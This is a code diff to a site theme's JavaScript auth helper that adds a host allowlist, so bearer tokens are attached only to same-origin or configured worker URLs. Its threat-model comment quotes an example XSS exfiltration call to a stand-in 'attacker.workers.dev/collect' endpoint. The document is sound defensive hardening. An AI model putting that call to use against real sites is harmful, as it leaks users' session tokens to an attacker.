@@ -8,19 +8,42 @@
  * attaches the bearer header internally before delegating to
  * window.fetch.
  *
- * Threat model: with admin-auth.js loaded site-wide (default.hbs), an
- * XSS anywhere on the site previously could call
- * `await window.MOAdminAuth.getToken()` and walk away with the bearer.
- * Closure-private design: the XSS can still call `MOAuth.fetch` to
- * make authenticated requests in the visitor's name — we can't stop
- * that without removing the helper entirely — but it CANNOT extract
- * the bearer to use against other systems or persist for later abuse.
+ * Threat model
+ * ============
+ * The original design (D1) made the bearer closure-private so an XSS
+ * couldn't extract it via `window.MOAdminAuth.getToken()`. But the
+ * Codex audit (2026-05-11) pointed out that the helper itself is a
+ * usable exfiltration mechanism: an XSS can call
+ *   window.MOAuth.fetch("https://attacker.workers.dev/collect")
+ * and the bearer goes straight to an attacker-controlled CORS
+ * endpoint. Closure-private only protected against EXTRACTION, not
+ * against ABUSE-IN-PLACE.
+ *
+ * This version adds a destination allowlist. authedFetch attaches the
+ * bearer only when the target host is:
+ *   - same-origin (location.host), OR
+ *   - one of the worker hosts the theme is configured to call (read
+ *     from <body data-*-worker-url>, <meta name="mo-api-base">, and
+ *     per-element data-worker-url / data-kit-bridge-url attributes).
+ *
+ * Any other destination is REJECTED with a TypeError before the fetch
+ * even goes out. No silent auth-stripping fallback — that masks bugs
+ * and gives an attacker an easy reconnaissance signal. The rejection
+ * is also console.error'd so it surfaces in mo-errors.
+ *
+ * Trade-off: an XSS can still call MOAuth.fetch against a TRUSTED
+ * worker (e.g. POST a bookmark in the user's name). That's the
+ * irreducible residue — short of removing the helper, there's no way
+ * to distinguish legitimate JS from XSS-injected JS once they share
+ * the page. But the JWT can no longer be exfiltrated to use against
+ * other systems or persist for later abuse.
  *
  * Public API (window.MOAuth):
  *   fetch(url, init?)
  *     Returns Promise<Response>. Identical to fetch() but with
- *     `Authorization: Bearer <jwt>` attached if a member is signed in.
- *     Init.headers is preserved; Authorization is overwritten.
+ *     `Authorization: Bearer <jwt>` attached if a member is signed
+ *     in AND the destination is allowlisted. Untrusted destinations
+ *     return a rejected promise.
  *
  * Notes:
  * - When no member is signed in (or token fetch fails) the request
@@ -29,16 +52,91 @@
  * - Token expiry: refreshed ~30s before exp claim. On 401 the token
  *   is invalidated immediately so the next call re-fetches a fresh one.
  *
+ * Adding a new worker to the allowlist:
+ *   - If it's stamped on body (data-foo-worker-url), it's harvested
+ *     automatically.
+ *   - If it's stamped on a per-element data-worker-url or similar,
+ *     the harvest runs lazily on first MOAuth.fetch call so by then
+ *     the DOM is parsed and the element exists.
+ *   - If it's hardcoded in JS, add the host to BUILTIN_TRUSTED_HOSTS
+ *     below.
+ *
  * Back-compat:
  * - The previous global `window.MOAdminAuth` (with .headers() and
- *   .getToken()) is REMOVED in this commit. Any caller still using
- *   it will error loudly — the synthesis flagged that as the desired
- *   behavior so a regression doesn't silently send unauthenticated
- *   requests. All in-tree callers were converted in the same commit.
+ *   .getToken()) is REMOVED. Any caller still using it errors loudly.
  */
 (function () {
   let cachedToken = null;
   let cachedExp = 0;
+
+  // ---------------------------------------------------------------------
+  // Destination allowlist
+  // ---------------------------------------------------------------------
+
+  // Hosts always allowed even if not present in the DOM. Mostly defensive
+  // — every legitimate worker should be discoverable from the DOM. Add to
+  // this set when a worker is called from JS without a corresponding
+  // data attribute (audit any addition carefully).
+  const BUILTIN_TRUSTED_HOSTS = new Set([
+    location.host,
+  ]);
+
+  // Filled lazily on first MOAuth.fetch call. We can't fully populate at
+  // IIFE-time because admin-auth.js now loads before {{{body}}} (so per-
+  // element data-worker-url attributes aren't parsed yet). Re-harvesting
+  // on first call is fine because no MOAuth.fetch happens before
+  // DOMContentLoaded in practice — all callers are either event handlers
+  // or post-load hydration.
+  const trustedHosts = new Set(BUILTIN_TRUSTED_HOSTS);
+  let harvested = false;
+
+  function addHost(url) {
+    if (!url) return;
+    try { trustedHosts.add(new URL(url, location.href).host); }
+    catch (_) { /* malformed config value — ignore */ }
+  }
+
+  function harvestTrustedHosts() {
+    const {body} = document;
+    if (body) {
+      // Body-stamped worker URLs from default.hbs.
+      for (const attr of [
+        "data-kit-worker-url",
+        "data-admin-worker-url",
+        "data-search-worker-url",
+        "data-error-worker-url",
+        "data-podcast-feed-url",
+      ]) {
+        addHost(body.getAttribute(attr));
+      }
+    }
+    // Membership API base (mo-membership).
+    const apiBaseMeta = document.querySelector('meta[name="mo-api-base"]');
+    if (apiBaseMeta) addHost(apiBaseMeta.getAttribute("content"));
+    // Per-element URLs (gift, kit-bridge, etc.) stamped inside {{{body}}}.
+    // querySelectorAll is a one-time pass — cheap.
+    document.querySelectorAll("[data-worker-url], [data-kit-bridge-url], [data-api-base]").forEach((el) => {
+      addHost(el.getAttribute("data-worker-url"));
+      addHost(el.getAttribute("data-kit-bridge-url"));
+      addHost(el.getAttribute("data-api-base"));
+    });
+    harvested = true;
+  }
+
+  function isTrusted(url) {
+    let parsed;
+    try { parsed = new URL(url, location.href); }
+    catch (_) { return false; }
+    if (trustedHosts.has(parsed.host)) return true;
+    // Late-added elements (e.g. an admin page that injects a node with
+    // data-worker-url after IIFE-time) — re-harvest once on the first
+    // miss after the initial harvest, in case the DOM grew.
+    if (harvested) {
+      harvestTrustedHosts();
+      if (trustedHosts.has(parsed.host)) return true;
+    }
+    return false;
+  }
 
   async function fetchTokenInternal() {
     try {
@@ -78,6 +176,15 @@
   }
 
   async function authedFetch(url, init) {
+    // Lazily build the trusted-hosts set the first time we're called.
+    // By now {{{body}}} has been parsed (callers are all post-load),
+    // so per-element data-worker-url attributes are visible.
+    if (!harvested) harvestTrustedHosts();
+    if (!isTrusted(url)) {
+      const err = new TypeError(`MOAuth.fetch refused: untrusted destination ${url}`);
+      console.error("[MOAuth] refusing to attach bearer to untrusted host", url);
+      return Promise.reject(err);
+    }
     const opts = { ...init || {}};
     const headers = new Headers((init && init.headers) || {});
     const token = await getTokenInternal();
